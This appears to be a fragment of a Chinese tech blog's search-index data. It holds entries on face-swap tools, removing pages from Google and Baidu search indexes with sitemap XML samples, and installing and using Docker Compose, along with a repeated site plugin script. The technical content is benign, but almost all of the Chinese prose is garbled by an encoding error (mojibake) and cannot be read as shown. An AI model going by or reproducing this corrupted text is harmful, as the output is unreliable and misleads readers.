å§è·‘å®Œä¹‹åï¼Œå°±å¾—åˆ°äº†æ¢è„¸åçš„è§†é¢‘ æ€»ç»“ æœ‰ä¸ªå¥½æ˜¾å¡ ä¸¤ä¸ªè§†é¢‘çš„äººç‰©è¡¨æƒ…ï¼Œè§’åº¦å°½é‡ç›¸ä¼¼ ç›¸å…³å¼€æºé¡¹ç›® faceswap DeepFaceLab deepfakes_faceswap var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"é€šè¿‡è°·æ­Œç«™é•¿å¹³å°å¿«é€Ÿæ”¶å½•ä¸åˆ é™¤ç½‘é¡µ",url:"/posts/fa4ebc1a.html",text:'æ¸…ç†åƒåœ¾æˆ–è€…æ— æ•ˆçš„è°·æ­Œæœç´¢è®°å½• æ¸…ç†æ­¥éª¤å¦‚ä¸‹ï¼š ä¸ºåƒåœ¾æˆ–è€…æ— æ•ˆçš„æœç´¢è®°å½•é“¾æ¥åˆ¶ä½œ 301 è·³è½¬ åœ¨ robots.txt ä¸­æ·»åŠ ç¦æ­¢æ”¶å½•æˆ–è€…æ— æ•ˆçš„æœç´¢è®°å½•çš„é“¾æ¥ é‡æ–°ç”Ÿæˆæ–°çš„ç«™ç‚¹åœ°å›¾æ–‡ä»¶ï¼Œå¹¶æäº¤åˆ° Google ç«™é•¿å¹³å° åˆ é™¤è°·æ­Œæœç´¢è®°å½• ç”±äºä¸Šé¢çš„æ­¥éª¤åšå®Œè¿˜éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½ç”Ÿæ•ˆï¼Œè€Œä¸”æ¯æ¬¡ä½¿ç”¨è°·æ­Œæœç´¢è¿˜æ˜¯å¯ä»¥çœ‹åˆ°è‡ªå·±çš„ç½‘ç«™æŒ‚ç€åƒåœ¾æˆ–æ— æ•ˆé“¾æ¥ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨è°·æ­Œç«™é•¿å¹³å°çš„ â€œç§»é™¤ç½‘å€â€ åŠŸèƒ½æ¥åˆ é™¤æœç´¢è®°å½•ã€‚è¿›åˆ°è°·æ­Œç«™é•¿å¹³å°çš„æ“ä½œåå°ï¼Œæ‰¾åˆ°è°·æ­Œç´¢å¼• -&gt; ç§»é™¤ç½‘å€ã€‚åœ¨è°·æ­Œæœç´¢æ¡†ä¸­è¾“å…¥â€site:xxx.comâ€ æŸ¥çœ‹è‡ªå·±ç«™ç‚¹çš„æ”¶å½•ç»“æœï¼ŒæŠŠä¸æƒ³è¢«æ”¶å½•çš„ URLï¼ˆä¸åŒ…å« http://åŸŸåï¼Œä¾‹å¦‚å¡«å†™ /posts/6edb1958/ å³å¯ï¼‰æäº¤åˆ°ç§»é™¤ç½‘å€é‡Œé¢ï¼Œç”Ÿæ•ˆæ—¶é—´ä¸€èˆ¬æ˜¯ 1-6 å°æ—¶ã€‚ è°·æ­Œæµè§ˆå™¨å®‰è£…æ‰¹é‡åˆ é™¤æœç´¢è®°å½•çš„æ’ä»¶ å¦‚æœåƒåœ¾æˆ–è€…æ— æ•ˆçš„è°·æ­Œæ”¶å½•é¡µé¢æœ‰ä¸Šç™¾ä¸ªï¼Œè¦æ˜¯ä¸€ä¸ªä¸ªæäº¤åˆ°ç§»é™¤ç½‘å€é‡Œé¢ï¼Œå·¥ä½œé‡éå¸¸å¤§ä¹Ÿä¸ç°å®ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ’ä»¶æ‰¹é‡åˆ é™¤æœç´¢è®°å½•ã€‚ä¸‹è½½æµè§ˆå™¨æ’ä»¶ï¼ŒChrome å®‰è£…æ’ä»¶éœ€è¦å¼€å¯å¼€å‘æ¨¡å¼ï¼Œå®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š ä» Github ä¸‹è½½æ’ä»¶åˆ°æœ¬åœ°å¹¶è§£å‹ æµè§ˆå™¨æ‰“å¼€é“¾æ¥ chrome://extensions/ ï¼Œå¯ç”¨å¼€å‘è€…æ¨¡å¼ é€‰æ‹©â€ åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åºâ€ï¼Œç„¶åé€‰æ‹©æ’ä»¶çš„è§£å‹ç›®å½• æ’ä»¶å®‰è£…åï¼Œåœ¨è°·æ­Œç«™é•¿å¹³å°çš„ â€œRemove URLsâ€ é¡µé¢ä¸­ï¼Œä¼šå‘ç°å¤šå‡º â€œé€‰æ‹©æ–‡ä»¶â€ çš„æŒ‰é’®ï¼Œå›¾ç‰‡å¦‚ä¸‹ï¼š è°·æ­Œæµè§ˆå™¨å®‰è£… SEOQUAKE æ’ä»¶ ç”±äºæ‰¹é‡åˆ é™¤æœç´¢è®°å½•çš„æ’ä»¶éœ€è¦ URL æ•°æ®æ–‡ä»¶ï¼Œå› æ­¤éœ€è¦å®‰è£… SEOQUAKE æ’ä»¶å¯¼å‡ºæœç´¢è®°å½•ä¸­çš„æ‰€æœ‰é“¾æ¥ã€‚SEOQUAKE æ’ä»¶çš„å®‰è£…ï¼Œå¯ä»¥åœ¨ Chrome ç½‘ä¸Šå•†åº—æœç´¢â€SEOQUAKEâ€ï¼Œç„¶åç›´æ¥å®‰è£…å³å¯ã€‚åœ¨è°·æ­Œæœç´¢æ¡†ä¸­è¾“å…¥â€site:xxx.comâ€ æŸ¥çœ‹è‡ªå·±ç«™ç‚¹çš„æ”¶å½•ç»“æœï¼Œç„¶åç‚¹å‡» SEOQUAKE æ’ä»¶çš„ â€ å¯¼å‡º CSVâ€ æŒ‰é’®ç›´æ¥å¯¼å‡º CSV æ–‡ä»¶ã€‚SEOQUAKE æ’ä»¶é»˜è®¤åªå¯¼å‡ºå•é¡µé¢çš„æ‰€æœ‰æœç´¢è®°å½•ã€‚ åˆ›å»º URL æ•°æ®æ–‡ä»¶ å°†ä¸Šé¢å¯¼å‡ºçš„ CSV æ–‡ä»¶ä¸­çš„ URL ç»Ÿä¸€å¤åˆ¶åˆ°å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ˆä¾‹å¦‚ï¼šgoogle-remove-urls.txtï¼‰ï¼Œæ ¼å¼ä¸ºæ¯è¡Œéƒ½æ˜¯å•ç‹¬çš„ URL åœ°å€ï¼ˆä¸åŒ…å« http://åŸŸåï¼‰ï¼Œä½¿ç”¨å›è½¦ç¬¦ \\n ä½œä¸ºç»“æŸç¬¦ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234/posts/3cf5ae19//posts/1b3fbf25//posts/b31f4d18//posts/fcb4fc9d/index.html é€šè¿‡æ‰¹é‡åˆ é™¤æœç´¢è®°å½•çš„æ’ä»¶æäº¤ URL æ•°æ®æ–‡ä»¶ æ‰¾åˆ°è°·æ­Œç´¢å¼• -&gt; ç§»é™¤ç½‘å€ï¼Œç‚¹å‡» â€œé€‰æ‹©æ–‡ä»¶â€ æŒ‰é’®ï¼Œé€‰æ‹©ä¸Šé¢æ•´ç†çš„ URL æ•°æ®æ–‡ä»¶ï¼Œä¹‹åä¼šçœ‹åˆ°æµè§ˆå™¨é¡µé¢åå¤è‡ªåŠ¨åˆ·æ–°ï¼Œé¡µé¢ä¸­çš„åˆ é™¤åˆ—è¡¨ä¹Ÿä¼šè‡ªåŠ¨æ·»åŠ  URLã€‚ è°·æ­Œå¿«é€Ÿæ”¶å½•ç½‘é¡µ æ‰¾åˆ°æŠ“å– -&gt; Google æŠ“å–æ–¹å¼ï¼Œå¡«å†™å¸Œæœ›è¢«æ”¶å½•çš„ URLï¼Œç„¶åç‚¹å‡» â€œFetch AND RENDERâ€ æŒ‰é’®åä¼šæœ‰å¼¹çª—ï¼Œå¯ä»¥é€‰æ‹©ä»…æŠ“å–æ­¤ç½‘å€ï¼ˆæ¯æœˆé™åˆ¶æäº¤ 500 æ¬¡ï¼‰æˆ–è€…æŠ“å–æ­¤ç½‘å€åŠå…¶ç›´æ¥é“¾æ¥ï¼ˆæ¯æœˆé™åˆ¶æäº¤ 10 æ¬¡ï¼‰ã€‚å¦‚æœå¡«å†™çš„æ˜¯ URL ç›®å½•ï¼Œåˆ™éœ€è¦ä»¥ / ç»“å°¾ï¼Œå¦åˆ™è°·æ­Œä¼šæŠŠä¸åŠ  / çš„ç½‘å€åˆ¤å®š 301 è·³è½¬ã€‚å½“ URL æäº¤ä¹‹åï¼Œæœ€åè®°å¾—ç‚¹å‡» â€œè¯·æ±‚ç¼–å…¥ç´¢å¼•â€ æŒ‰é’®ã€‚ ç›¸å…³ç«™ç‚¹ æ‰¹é‡åˆ é™¤æœç´¢è®°å½•çš„ Chrome æ’ä»¶ æ“ä½œ Google Webmaster è®©ç½‘ç«™å¿«é€Ÿæ”¶å½•ä¸åˆ é™¤ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çˆ¬è™«"},{title:"åˆ é™¤ç™¾åº¦æœç´¢å¼•æ“æ”¶å½•çš„æ­»é“¾ä¸æ— æ•ˆå¿«ç…§",url:"/posts/1619dded.html",text:'ç™¾åº¦ç«™é•¿æ­»é“¾æäº¤å·¥å…·ä»‹ç» æ­»é“¾æäº¤å·¥å…·ç”Ÿæ•ˆæ—¶é—´ä¸º 3 å¤© æ­»é“¾æäº¤æœ‰ä¸¤ç§æ–¹å¼ï¼šæ–‡ä»¶æäº¤ã€è§„åˆ™æäº¤ æ­»é“¾æäº¤å·¥å…·ä»…è¯†åˆ« 404 æ•°æ®ï¼Œè¯·æäº¤ 404 æ•°æ®ï¼›å¦‚è¯¯ä½¿ç”¨æœ¬å·¥å…·ï¼Œä¸”ç«™ç‚¹å†…å®¹ä¸ä¸ºæ­»é“¾ï¼Œåˆ™æäº¤ä¸ä¼šç”Ÿæ•ˆ æ­»é“¾æäº¤å·¥å…·æ˜¯ç½‘ç«™å‘ç™¾åº¦æäº¤æ­»é“¾çš„æ•°æ®æ¨é€å·¥å…·ï¼Œè¢«æ¨é€æ­»é“¾å°†è¢«ç™¾åº¦æœç´¢å±è”½ã€‚ç½‘ç«™å­˜åœ¨å¤§é‡æ­»é“¾ï¼Œå°†å½±å“ç½‘ç«™çš„ç«™ç‚¹è¯„çº§ ç™¾åº¦ç«™é•¿å¹³å°æäº¤æ­»é“¾ æ³¨å†Œç™¾åº¦ç«™é•¿å¹³å°å¸å·ï¼Œç„¶åç™»å½•è¿›å»æ‰¾åˆ°â€ æ•°æ®å¼•å…¥â€ -&gt; â€œæ­»é“¾æäº¤â€ã€‚ æ–‡ä»¶æäº¤æ–¹å¼ ç¬¬ä¸€æ­¥ï¼Œåˆ¶ä½œæ­»é“¾æ–‡ä»¶å¤„ç†ç½‘ç«™å·²å­˜åœ¨çš„æ­»é“¾ï¼Œå¹¶å°†è¿™äº›æ­»é“¾é¡µé¢è®¾ç½®æˆä¸º 404 é¡µé¢ï¼Œå³ç™¾åº¦è®¿é—®å®ƒä»¬æ—¶è¿”å› 404 ä»£ç ã€‚å°†éœ€è¦æäº¤çš„æ­»é“¾åˆ—è¡¨åˆ¶ä½œæˆä¸€ä¸ªæ­»é“¾æ–‡ä»¶ï¼Œåˆ¶ä½œæ–¹æ³•ä¸ sitemap æ ¼å¼åŠåˆ¶ä½œæ–¹æ³•ä¸€è‡´ã€‚æ­»é“¾æ–‡ä»¶çš„æ ¼å¼ä¸º txt æˆ–è€… xmlï¼Œæ¯ä¸ªåœ°å€æ–‡ä»¶æœ€å¤šåŒ…å« 50000 ä¸ªç½‘å€ä¸”éœ€å°äº 10MBï¼Œæ¨èä½¿ç”¨ xml æ ¼å¼ã€‚æ­»é“¾ xml æ–‡ä»¶ç¤ºä¾‹å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/67ba58dd/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; ç¬¬äºŒæ­¥ï¼Œå°†æ­»é“¾æ–‡ä»¶æ”¾ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ¯”å¦‚æ‚¨çš„ç½‘ç«™ä¸º example.comï¼Œæ‚¨å·²åˆ¶ä½œäº†ä¸€ä¸ª silian_example.xml æ­»é“¾æ–‡ä»¶ï¼Œåˆ™å°† silian_example.xml ä¸Šä¼ è‡³ç½‘ç«™æ ¹ç›®å½•å³ example.com/silian_example.xml ç¬¬ä¸‰æ­¥ï¼Œæäº¤æ­»é“¾æ–‡ä»¶ æ‰¾åˆ°â€ æ•°æ®å¼•å…¥â€ -&gt; â€œæ­»é“¾æäº¤â€ -&gt; â€œæ–‡ä»¶æäº¤â€ æäº¤æ­»é“¾æ–‡ä»¶æ—¶ï¼Œæ¯æ¬¡æœ€å¤šå¯æäº¤ 20 æ¡æ­»é“¾æ–‡ä»¶åœ°å€ æäº¤æ­»é“¾æ–‡ä»¶ï¼Œå¡«å†™æ­»é“¾æ–‡ä»¶åœ°å€ï¼ˆå¦‚ï¼š www.example.com/silian_example.xml ï¼‰ï¼Œé€‰æ‹©æ›´æ–°æ—¶é—´ï¼Œç„¶åæäº¤ ç¬¬å››æ­¥ï¼Œç®¡ç†å·²æäº¤çš„æ­»é“¾æ–‡ä»¶æäº¤å®Œä¹‹åï¼Œå¯åœ¨æ•°æ®åé¦ˆé‡Œçœ‹åˆ°å·²æäº¤çš„æ­»é“¾æ–‡ä»¶ï¼Œå¦‚æœæ­»é“¾æ–‡ä»¶é‡Œé¢æœ‰æ–°çš„æ­»é“¾ï¼Œå¯ä»¥é€‰æ‹©æ–‡ä»¶åï¼Œç‚¹å‡»æ‰‹åŠ¨æ›´æ–°æ–‡ä»¶ï¼Œå³å¯¹æ›´æ–°çš„æ­»é“¾é“¾æ¥è¿›è¡Œäº†æäº¤ã€‚ è§„åˆ™æäº¤æ–¹å¼ ç¬¬ä¸€æ­¥æ‰¾åˆ°â€ æ•°æ®å¼•å…¥â€ -&gt; â€œæ­»é“¾æäº¤â€ -&gt; â€œè§„åˆ™æäº¤â€ ç¬¬äºŒæ­¥ï¼Œæäº¤æ­»é“¾è§„åˆ™å¡«å†™æ­»é“¾è§„åˆ™ï¼Œæ­»é“¾è§„åˆ™éœ€è¦ä»¥ / æˆ–ï¼Ÿç»“å°¾ã€‚/ ç»“å°¾è¡¨ç¤ºåˆ é™¤ä¸€ä¸ªç›®å½•ï¼Œä¾‹å¦‚ï¼šhttp://www.example.com/silian/ åŒ…å« silian ç›®å½•ä¸‹çš„æ‰€æœ‰é“¾æ¥ã€‚? ç»“å°¾è¡¨ç¤º CGI å½¢å¼çš„é€šé…é“¾æ¥ï¼Œä¾‹å¦‚ï¼šhttp://www.example.com/silian? åŒ…å«é•¿ç›¸ä¸º silian?* çš„æ‰€æœ‰é“¾æ¥ã€‚ç›¸åŒçš„æ­»é“¾è§„åˆ™ä¸€ä¸ªæœˆå†…åªèƒ½æäº¤ä¸€æ¬¡ã€‚ ç¬¬ä¸‰æ­¥ï¼Œç®¡ç†å·²æäº¤çš„æ­»é“¾è§„åˆ™æ­»é“¾è§„åˆ™æäº¤å®Œä¹‹åï¼ŒåŒæ ·å¯åœ¨æ•°æ®åé¦ˆé‡Œçœ‹åˆ°å·²æäº¤çš„æ­»é“¾è§„åˆ™ï¼Œå¦‚æœæ­»é“¾è§„åˆ™é‡Œé¢æœ‰æ–°çš„æ­»é“¾ï¼Œå¯ä»¥é€‰æ‹©è§„åˆ™åï¼Œç‚¹å‡»æ‰‹åŠ¨æ›´æ–°æ­»é“¾ï¼Œå³å¯¹æ›´æ–°çš„æ­»é“¾é“¾æ¥è¿›è¡Œäº†æäº¤ã€‚ åˆ é™¤ç™¾åº¦æœç´¢çš„å¿«ç…§ ç¬¬ä¸€æ­¥ï¼Œè·å–ç™¾åº¦å¿«ç…§é“¾æ¥ ç¬¬äºŒæ­¥ï¼Œæäº¤éœ€è¦åˆ é™¤çš„ç™¾åº¦å¿«ç…§ / ç´¢å¼•é“¾æ¥æ‰“å¼€ç™¾åº¦æœåŠ¡ä¸­å¿ƒçš„æ„è§åé¦ˆé¡µé¢ï¼Œæ‰¾åˆ° â€œå¿«ç…§åˆ é™¤ä¸æ›´æ–°â€ï¼Œç„¶åå¡«å†™ç™¾åº¦å¿«ç…§ / ç´¢å¼•é“¾æ¥ï¼Œæœ€åç‚¹å‡» â€œæäº¤â€ æŒ‰é’®è¿›è¡Œæäº¤ã€‚ ç¬¬ä¸‰æ­¥ï¼ŒæŸ¥çœ‹å¿«ç…§åˆ é™¤çš„å¤„ç†è¿›åº¦æ‰¾åˆ°ç™¾åº¦æœåŠ¡ä¸­å¿ƒé¡µé¢çš„ â€œæˆ‘çš„åé¦ˆâ€ï¼Œç‚¹å‡»è¿›å»å¯ä»¥åœ¨é¡µé¢ä¸Šçœ‹åˆ°å¿«ç…§åˆ é™¤ä¸æ›´æ–°çš„å¤„ç†è¿›åº¦ã€‚ç™¾åº¦å¤„ç†å¿«ç…§åˆ é™¤ä¸æ›´æ–°çš„é€Ÿåº¦è¾ƒæ…¢ï¼Œæäº¤åä¸€èˆ¬éœ€è¦ 24 å°æ—¶å·¦å³è¯·æ±‚æ‰ä¼šè¢«å¤„ç†ã€‚ æ­»é“¾ XML æ–‡ä»¶æ ¼å¼è¯¦ç»†è¯´æ˜ 12345678910111213141516&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!-- urlsetï¼Œurlset ç”¨æ¥æ ‡è®°æ•´ä¸ªæ–‡æ¡£çš„å¼€å¤´ï¼Œæœ€å°‘å‡ºç° 1 æ¬¡ æœ€å¤šå‡ºç° 1 æ¬¡ --&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;!-- urlï¼Œurl æ ‡è®°æ¯æ¡ä¿¡æ¯çš„å¼€å§‹å’Œç»“æŸï¼Œæœ€å°‘å‡ºç° 0 æ¬¡ æœ€å¤šå‡ºç° 50000 æ¬¡ --&gt; &lt;url&gt; &lt;!-- locï¼Œè¯¥æ¡æ•°æ®çš„å­˜æ”¾åœ°å€ï¼Œæœ€å°‘å‡ºç° 1 æ¬¡ æœ€å¤šå‡ºç° 1 æ¬¡ï¼Œç±»å‹ä¸º URL åœ°å€ï¼Œæœ€å°é•¿åº¦ 1 ä¸ªå­—ç¬¦ æœ€å¤§é•¿åº¦ 256 ä¸ªå­—ç¬¦ å¿…é¡»ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼(http://)(.+) --&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/&lt;/loc&gt; &lt;!-- lastmodï¼ŒæŒ‡è¯¥æ¡æ•°æ®çš„æœ€æ–°ä¸€æ¬¡æ›´æ–°æ—¶é—´ï¼Œæœ€å°‘å‡ºç° 0 æ¬¡ æœ€å¤šå‡ºç° 1 æ¬¡ï¼Œç±»å‹ä¸ºæ—¥æœŸæˆ–æ—¥æœŸæ—¶é—´ï¼Œæ ¼å¼ä¸º YYYY-MM-DD çš„æ—¥æœŸæˆ–è€… æ ¼å¼ä¸º YYYY-MM-DDThh:mm:ss çš„æ—¥æœŸæ—¶é—´ï¼ˆè¯·æ³¨æ„æ—¥æœŸä¸æ—¶é—´ä¹‹é—´ä»¥â€œTâ€åˆ†éš”ï¼‰ --&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;!-- changefreqï¼ŒæŒ‡è¯¥æ¡æ•°æ®çš„æ›´æ–°é¢‘ç‡ï¼Œæœ€å°‘å‡ºç° 0 æ¬¡ æœ€å¤šå‡ºç° 1 æ¬¡ï¼Œç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œæœ‰æ•ˆå€¼ä¸ºï¼šalwaysã€hourlyã€dailyã€weeklyã€monthlyã€yearlyã€never --&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;!-- priorityï¼Œç”¨æ¥æŒ‡å®šæ­¤é“¾æ¥ç›¸å¯¹äºå…¶ä»–é“¾æ¥çš„ä¼˜å…ˆæƒæ¯”å€¼ï¼Œæ­¤å€¼å®šäº 0.0-1.0 ä¹‹é—´ï¼Œæœ€å°‘å‡ºç° 0 æ¬¡ æœ€å¤šå‡ºç° 1 æ¬¡ï¼Œç±»å‹ä¸ºå°æ•°ï¼Œæœ€å°å€¼ä¸ºï¼ˆåŒ…å«ï¼‰0.0 æœ€å¤§å€¼ä¸ºï¼ˆåŒ…å«ï¼‰1.0 --&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çˆ¬è™«"},{title:"Docker ä¹‹åä¸ƒ Docker-Compose å®‰è£…ä¸ä½¿ç”¨",url:"/posts/b31f4d18.html",text:'ç›¸å…³ç«™ç‚¹ Docker Compose Docs Docker Compose Github Docker Compose Releases Docker Compose ä»‹ç» Docker Compose é¡¹ç›®æ¥æºäºä»¥å‰çš„ fig é¡¹ç›®ï¼Œä½¿ç”¨ Python è¯­è¨€ç¼–å†™ï¼Œæ˜¯ Docker å®˜æ–¹æ¨å‡ºçš„ä¸€æ¬¾å•æœºå®¹å™¨ç¼–æ’å·¥å…·ï¼Œä¸ Docker Swarmã€Docker Machine å¹¶ç§°ä¸º Docker å®¹å™¨ç¼–æ’ä¸‰å‰‘å®¢ã€‚å…¶æ”¯æŒå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨çš„åº”ç”¨ï¼Œå¯ä»¥ä¸€æ¡å‘½ä»¤å¯åŠ¨å¤šä¸ªå®¹å™¨ï¼Œä½¿ç”¨ Docker Compose åä¸å†éœ€è¦ä½¿ç”¨ Shell è„šæœ¬æ¥å¯åŠ¨å®¹å™¨ã€‚Docker Compose é€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥ç®¡ç†å¤šä¸ª Docker å®¹å™¨ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­æ‰€æœ‰çš„å®¹å™¨é€šè¿‡ services æ¥å®šä¹‰ï¼Œç„¶åä½¿ç”¨ docker-compose å‘½ä»¤æ¥å¯åŠ¨ã€åœæ­¢ã€é‡å¯åº”ç”¨å’Œåº”ç”¨ä¸­çš„æœåŠ¡ä»¥åŠæ‰€æœ‰ä¾èµ–æœåŠ¡çš„å®¹å™¨ï¼Œéå¸¸é€‚åˆç»„åˆä½¿ç”¨å¤šä¸ªå®¹å™¨è¿›è¡Œå¼€å‘çš„åœºæ™¯ã€‚ å®‰è£… Docker Compose Docker Compose å…·ä½“çš„ç‰ˆæœ¬å·å¯ä»¥ä» Docker Compose Releases è·å–ã€‚ 1234567891011# ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚æœéœ€è¦å®‰è£…å…¶ä»–ç‰ˆæœ¬çš„è¯ï¼Œä¿®æ”¹ä¸‹é¢å‘½ä»¤ä¸­çš„ç‰ˆæœ¬å·å³å¯# curl -L https://github.com/docker/compose/releases/download/1.24.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose# æ ¡éªŒäºŒè¿›åˆ¶æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œå¯¹æ¯”https://github.com/docker/compose/releases/tag/1.24.0-rc1é¡µé¢ä¸­äºŒè¿›åˆ¶æ–‡ä»¶çœŸå®çš„SHA-256sumå€¼# sha256sum /usr/local/bin/docker-compose# èµ‹äºˆäºŒè¿›åˆ¶æ–‡ä»¶å¯æ‰§è¡Œæƒé™# chmod +x /usr/local/bin/docker-compose# æŸ¥çœ‹docker-composeçš„ç‰ˆæœ¬å·# docker-compose version å®‰è£… Docker Compose çš„å‘½ä»¤è‡ªåŠ¨è¡¥å…¨å·¥å…· 1234567# å®‰è£…bashå‘½ä»¤è‡ªåŠ¨è¡¥å…¨è½¯ä»¶åŒ…# yum install bash-completion# ä¸‹è½½docker-composeå‘½ä»¤è‡ªåŠ¨è¡¥å…¨å·¥å…·çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œçš„ç‰ˆæœ¬å·å¿…é¡»å’Œä¸Šé¢docker-composeçš„ç‰ˆæœ¬å·ä¸€è‡´# curl -L https://raw.githubusercontent.com/docker/compose/1.24.0-rc1/contrib/completion/bash/docker-compose -o /etc/bash_completion.d/docker-compose# æ³¨æ„ï¼šdocker-composeå‘½ä»¤è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½åœ¨é‡æ–°ç™»å½•åæ‰ä¼šç”Ÿæ•ˆ Docker Compose å¸¸ç”¨å‘½ä»¤ 1234567891011121314151617181920# æ‹‰å–é•œåƒ# docker-compose pull# åˆ›å»ºå¹¶å‰å°å¯åŠ¨å®¹å™¨# docker-compose up# åˆ›å»ºå¹¶åå°å¯åŠ¨å®¹å™¨# docker-compose up -d# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker-compose ps# å¯åŠ¨å®¹å™¨# docker-compose start# åœæ­¢å®¹å™¨# docker-compose stop# åœæ­¢å¹¶åˆ é™¤å®¹å™¨ï¼ŒåŒ…æ‹¬ç½‘ç»œã€æ•°æ®å·ï¼ˆç‰¹åˆ«æ³¨æ„ï¼Œæ­¤æ“ä½œä¼šåˆ é™¤æ‰€æœ‰å®¹å™¨çš„æ•°æ®ï¼Œä¸”æ•°æ®ä¸å¯æ¢å¤ï¼‰# docker-compose down è‹¥ YAML é…ç½®æ–‡ä»¶ä¸åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæˆ–è€…é…ç½®æ–‡ä»¶åä¸æ˜¯ docker-compose.ymlã€docker-compose.yamlï¼Œé‚£ä¹ˆåˆ™éœ€è¦é€šè¿‡ -f å‚æ•°æŒ‡å®š YAML é…ç½®æ–‡ä»¶çš„è·¯å¾„ 12# æŒ‡å®šYAMLé…ç½®æ–‡ä»¶ï¼Œæ‹‰å–é•œåƒ# docker-compose -f /example/nacos-standalone-mysql-5.7.yml pull Docker Compose é…ç½®æ–‡ä»¶ç¼–å†™ç¤ºä¾‹ docker-compose.yml é…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦å®šä¹‰äº†å®¹å™¨ zookeeper ä¸ dubbo-adminï¼Œå…¶ä¸­é€šè¿‡è‡ªå®šä¹‰ç½‘ç»œï¼ˆç½‘æ¡¥ï¼‰æ¥æŒ‡å®šæ¯ä¸ªå®¹å™¨çš„ IP åœ°å€ï¼ˆé™æ€ IPï¼‰ 1234567891011121314151617181920212223242526272829303132version: "3.5"services: zookeeper: image: clay/zookeeper-server:3.4.13 container_name: dubbo-zookeeper ports: - 2181:2181 networks: distributed-network: ipv4_address: 172.171.0.2 volumes: - \'/container/zookeeper/log:/usr/local/zookeeper-3.4.13/log\' - \'/container/zookeeper/data:/usr/local/zookeeper-3.4.13/data\' dubbo-admin: image: clay/dubbo-admin:0.1 container_name: dubbo-admin depends_on: - zookeeper networks: distributed-network: ipv4_address: 172.171.0.3 ports: - 8083:8080networks: distributed-network: name: distributed-network driver: bridge ipam: config: - subnet: 172.171.0.0/24 Docker Compose è¦†ç›–é•œåƒä¸­çš„ CMD æŒ‡ä»¤ 12345678910111213version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server 